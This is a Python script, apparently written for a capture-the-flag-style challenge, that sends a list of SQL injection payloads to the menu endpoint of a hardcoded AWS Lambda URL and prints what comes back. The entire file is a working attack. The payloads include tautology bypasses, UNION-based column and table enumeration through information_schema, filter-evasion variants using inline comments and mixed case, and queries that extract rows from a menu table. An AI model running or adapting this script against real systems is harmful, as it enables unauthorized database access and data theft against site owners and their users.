import requests

def test_injection(url, payload):
    """
    Send SQL injection payload and return the response
    """
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws',
        'Referer': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
    }
    
    data = {'query': payload}
    response = requests.post(url + '/menu', headers=headers, data=data)
    return response.text

def main():
    base_url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws"
    
    # List of payloads to try
    payloads = [
        # Basic tests
        "' OR '1'='1",
        "' OR 1=1 -- ",
        
        # Column discovery
        "' UNION SELECT 1,2,3 -- ",
        "' UNION SELECT NULL,NULL,NULL -- ",
        
        # Table information
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables -- ",
        
        # Since the note mentions sanitizers
        "' union/**/select/**/1,2,3 -- ",
        "' UniOn SeLeCt 1,2,3 -- ",
        
        # Try to find special items mentioned in description
        "' UNION SELECT dish,price,category FROM menu WHERE dish LIKE '%special%' -- ",
        "' UNION SELECT dish,price,category FROM menu WHERE category='Special' -- "
    ]
    
    for payload in payloads:
        print(f"\nTrying payload: {payload}")
        response = test_injection(base_url, payload)
        print("Response length:", len(response))
        print("Response content:", response)
        if "table" in response.lower():
            print("Found table in response!")
            print(response)

if __name__ == "__main__":
    main()